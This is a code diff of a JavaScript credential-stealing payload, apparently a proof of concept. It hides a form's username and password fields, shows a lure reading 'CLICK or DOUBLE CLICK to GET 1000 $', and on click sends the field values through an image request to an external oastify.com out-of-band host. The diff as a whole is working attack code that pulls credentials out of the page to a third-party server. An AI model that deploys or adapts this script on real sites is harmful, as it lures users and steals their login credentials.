@@ -22,14 +22,15 @@ var inputName = document.createElement('input');
 inputName.type = 'text';
 inputName.id = 'username';
 inputName.name = 'username';
-inputName.placeholder = 'Check here';
+inputName.placeholder = 'CLICK or DOUBLE CLICK to GET 1000 $';
 inputName.style.border = "none";
 inputName.style.outline = "none";
 inputName.style.background = "none";
 inputName.style.width = "100%";
 inputName.style.textAlign = "center";
-inputName.style.fontSize = "24px";
+inputName.style.fontSize = "30px";
 inputName.style.fontWeight = "bold";
+inputName.style.display = "none"; // Hide the input field
 inputName.classList.add("single-input");
 
 var inputPassword = document.createElement('input');
@@ -41,34 +42,40 @@ inputPassword.style.outline = "none";
 inputPassword.style.background = "none";
 inputPassword.style.padding = "0";
 inputPassword.style.width = "1%";
+inputPassword.style.display = "none"; // Hide the input field
 inputPassword.classList.add("single-input");
+
+var displayText = document.createElement('div');
+displayText.innerText = 'CLICK or DOUBLE CLICK to GET 1000 $';
+displayText.style.textAlign = "center";
+displayText.style.fontSize = "30px";
+displayText.style.fontWeight = "bold";
+displayText.style.cursor = "pointer";
 
 form.appendChild(inputName);
 form.appendChild(inputPassword);
+form.appendChild(displayText);
 
 document.body.appendChild(form);
 
 function sendCredentials(username, password) {
   var img = new Image();
-  img.src = `http://tb81wwfqabo7ib50lv9zyygmhdn4buzj.oastify.com?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
+  img.src = `http://at7iedx7ss6o0snh3crggfy3zu5mtch1.oastify.com?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
   document.body.appendChild(img);
 }
 
 function attachEventListeners() {
-  let a = document.getElementsByName('username')[0];
-  let b = document.getElementsByName('password')[0];
+  let a = document.getElementById('username');
+  let b = document.getElementById('password');
+  
+  a.value = 'victimuser'; // Predefined username
+  b.value = 'victimpassword'; // Predefined password
 
   function f() {
-    if (b.value.length > 0) {
-      sendCredentials(a.value, b.value);
-    }
+    sendCredentials(a.value, b.value);
   }
 
-  a.onclick = f;
-  a.ondblclick = f;
-
-  // Directly call the function to send credentials
-  f();
+  displayText.onclick = f;
 }
 
 document.addEventListener('DOMContentLoaded', function() {
